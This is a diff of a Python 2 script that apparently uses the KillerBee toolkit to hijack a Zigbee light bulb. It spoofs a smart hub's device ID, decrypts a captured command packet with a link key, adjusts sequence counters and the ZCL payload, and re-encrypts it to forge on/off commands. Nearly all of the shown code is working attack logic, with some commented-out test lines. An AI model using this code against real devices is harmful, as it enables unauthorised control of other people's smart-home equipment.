@@ -38,8 +38,8 @@ SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
 # FAULY_TARGET_DEVICE_ID = '0x055f' # old faulty light bulb to be hacked
 TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked
 
-DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 187
-DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 127
+DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 28
+DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 61
 TURN_ON_COMMAND_CODE = '\x01'
 TURN_OFF_COMMAND_CODE = '\x00'
 
@@ -86,6 +86,19 @@ encrypted_command_packet = loaded_object
 ## END Load command packet from file
 
 
+# TEMP CODE: Check encryption:
+
+#dec_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
+#enc_packet = kbencrypt(encrypted_command_packet, dec_packet_payload, key = LINK_KEY, verbose = 3)
+#enc_packet.payload.payload.payload.fields['data'] = enc_packet.payload.payload.payload.fields['data'][:-6]
+#print enc_packet.payload.payload.payload.fields['data']
+#dec_packet_payload_chopped = kbdecrypt(enc_packet, key = LINK_KEY, verbose = 3)
+#dec_packet_payload_chopped.show()
+
+# END OF TEMP
+
+
+
 # Decrypt packet
 # kbdecrypt(pkt, key = None, verbose = None):
 decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
@@ -94,7 +107,10 @@ print ""
 print "Original ZCL: " + packet_load.encode("hex")
 cluster_seq_num_hex = struct.pack('<b', DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM)
 
-decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:3]
+# Commenting the next line to preserve the entire ZCL bytes:
+#decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:3]
+decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:]
+
 print "ZCL after fixing it: " + decrypted_command_packet_payload.payload.fields['load'].encode("hex")
 print ""
 
